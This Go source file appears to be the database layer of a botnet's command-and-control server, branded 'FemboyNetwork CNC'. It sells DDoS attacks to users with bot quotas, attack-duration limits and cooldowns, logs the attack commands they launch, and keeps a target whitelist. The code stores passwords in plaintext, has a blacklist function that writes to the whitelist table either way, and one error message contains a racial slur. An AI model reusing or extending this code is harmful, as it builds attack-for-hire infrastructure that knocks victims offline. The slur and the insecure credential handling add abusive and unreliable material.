package main

import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
	db *sql.DB
}

type AccountInfo struct {
	username      string
	maxBots       int
	admin         int
	durationLimit int
	cooldown      int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("\x1b[97m[ \x1b[96mFemboyNetwork CNC ready\x1b[97m]")

	return &Database{db}
}

func (this *Database) TryLogin(username string, password string, ip net.Addr) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ?", username, password)
	if err != nil {
		fmt.Println("TryLogin query error:", err)
		return false, AccountInfo{username: "", maxBots: 0, admin: 0}
	}
	defer rows.Close()

	t := time.Now()
	strRemoteAddr := ip.String()
	host, _, splitErr := net.SplitHostPort(strRemoteAddr)
	if splitErr != nil {
		host = strRemoteAddr
	}
	if !rows.Next() {
		fmt.Printf("Failed Login In :: %s :: %s :: %s\n", username, host, t.Format("20060102150405"))
		this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", host)
		return false, AccountInfo{username: "", maxBots: 0, admin: 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	row := this.db.QueryRow("SELECT duration_limit, cooldown FROM users WHERE username = ?", accInfo.username)
	var dlim, cd sql.NullInt64
	if err := row.Scan(&dlim, &cd); err == nil {
		if dlim.Valid {
			accInfo.durationLimit = int(dlim.Int64)
		} else {
			accInfo.durationLimit = -1
		}
		if cd.Valid {
			accInfo.cooldown = int(cd.Int64)
		} else {
			accInfo.cooldown = 0
		}
	}

	fmt.Printf("Logged In :: %s :: %s :: %s\n", accInfo.username, host, t.Format("20060102150405"))
	this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", accInfo.username, "Login", host)

	return true, accInfo
}

func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	if peerMgr != nil {
		peerMgr.BroadcastUserAdd(username, password, max_bots, duration, cooldown, 0)
	}
	return true
}

func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	if peerMgr != nil {
		peerMgr.BroadcastUserAdd(username, password, max_bots, duration, cooldown, 1)
	}
	return true
}

func (this *Database) RemoveUser(username string) bool {
	result, err := this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	affected, _ := result.RowsAffected()
	if affected == 0 {
		return false
	}
	if peerMgr != nil {
		peerMgr.BroadcastUserDel(username)
	}
	return true
}

func (this *Database) ManageBlacklist(action, cidr string, isBlacklist bool) error {
	table := "whitelist"
	if isBlacklist {
		table = "whitelist"
	}

	parts := strings.SplitN(cidr, "/", 2)
	prefix := parts[0]
	netmask := "32"
	if len(parts) >= 2 {
		netmask = parts[1]
	}

	switch action {
	case "add":
		_, err := this.db.Exec(
			fmt.Sprintf("INSERT INTO %s (prefix, netmask) VALUES (?, ?) ON DUPLICATE KEY UPDATE netmask=?", table),
			prefix, netmask, netmask)
		return err
	case "del", "delete", "remove":
		result, err := this.db.Exec(
			fmt.Sprintf("DELETE FROM %s WHERE prefix = ?", table), prefix)
		if err != nil {
			return err
		}
		n, _ := result.RowsAffected()
		if n == 0 {
			return fmt.Errorf("prefix %s not found", prefix)
		}
		return nil
	case "list":
		rows, err := this.db.Query(fmt.Sprintf("SELECT prefix, netmask FROM %s ORDER BY prefix", table))
		if err != nil {
			return err
		}
		defer rows.Close()
		var entries []string
		for rows.Next() {
			var p string
			var n int
			rows.Scan(&p, &n)
			entries = append(entries, fmt.Sprintf("  %s/%d", p, n))
		}
		if len(entries) == 0 {
			return fmt.Errorf("(empty)")
		}
		return fmt.Errorf("ok:%s", strings.Join(entries, "\r\n"))
	default:
		return fmt.Errorf("unknown action: %s (use add/del/list)", action)
	}
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > netmask {
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask {
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else {
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false, err
	}
	defer rows.Close()
	var userId, durationLimit, admin, cooldown uint32
	if !rows.Next() {
		return false, errors.New("Sike you have been BANNED dm your seller for more info :)")
	}
	rows.Scan(&userId, &durationLimit, &admin, &cooldown)

	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("DOnt try sending attacks longer than %d seconds.", durationLimit))
	}
	rows.Close()

	if admin == 0 {
		rows2, err := this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
			return false, err
		}
		defer rows2.Close()
		if rows2.Next() {
			var timeSent, historyDuration uint32
			rows2.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Nigga chill ur ass let them skids live  %d seconds remaining", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}

	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	return true, nil
}

func (this *Database) GetAttackHistory(username string, limit int, orderAsc bool) ([]map[string]string, error) {
	var userId int
	row := this.db.QueryRow("SELECT id FROM users WHERE username = ?", username)
	if err := row.Scan(&userId); err != nil {
		return nil, err
	}
	order := "DESC"
	if orderAsc {
		order = "ASC"
	}
	rows, err := this.db.Query("SELECT time_sent, duration, command, max_bots FROM history WHERE user_id = ? ORDER BY time_sent "+order+" LIMIT ?", userId, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []map[string]string
	for rows.Next() {
		var ts, dur int
		var cmd string
		var mb int
		if err := rows.Scan(&ts, &dur, &cmd, &mb); err != nil {
			continue
		}
		out = append(out, map[string]string{
			"time": fmt.Sprintf("%d", ts), "duration": fmt.Sprintf("%d", dur), "command": cmd, "max_bots": fmt.Sprintf("%d", mb),
		})
	}
	return out, nil
}

func (this *Database) GetUsers() ([]map[string]string, error) {
	rows, err := this.db.Query("SELECT username, max_bots, admin, duration_limit, cooldown FROM users ORDER BY username")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []map[string]string
	for rows.Next() {
		var u string
		var mb, adm, dlim, cd int
		if err := rows.Scan(&u, &mb, &adm, &dlim, &cd); err != nil {
			continue
		}
		out = append(out, map[string]string{
			"user": u, "max_bots": fmt.Sprintf("%d", mb), "admin": fmt.Sprintf("%d", adm),
			"duration": fmt.Sprintf("%d", dlim), "cooldown": fmt.Sprintf("%d", cd),
		})
	}
	return out, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{username: "", maxBots: 0, admin: 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{username: "", maxBots: 0, admin: 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}
